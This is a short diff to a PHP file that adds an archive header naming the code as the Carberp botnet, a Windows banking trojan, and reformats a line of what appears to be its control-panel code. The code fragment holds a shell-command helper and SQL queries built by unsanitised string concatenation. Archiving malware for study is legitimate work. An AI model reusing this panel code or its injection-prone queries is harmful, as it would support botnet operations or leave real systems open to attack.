@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 function system_to($cmd){
@@ -16,7 +27,8 @@ function suexec($deamon = false){
     $to = '';
 }
 
-if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_servers WHERE id = '.$Cur['id'].' LIMIT 1');
+if(!empty($Cur['id'])){
+	$item = $mysqli->query('SELECT * from bf_servers WHERE id = '.$Cur['id'].' LIMIT 1');
 
 	if($item->id == $Cur['id']){
 		$mysqli->query('DELETE FROM bf_servers WHERE (id = \''.$item->id.'\') LIMIT 1');
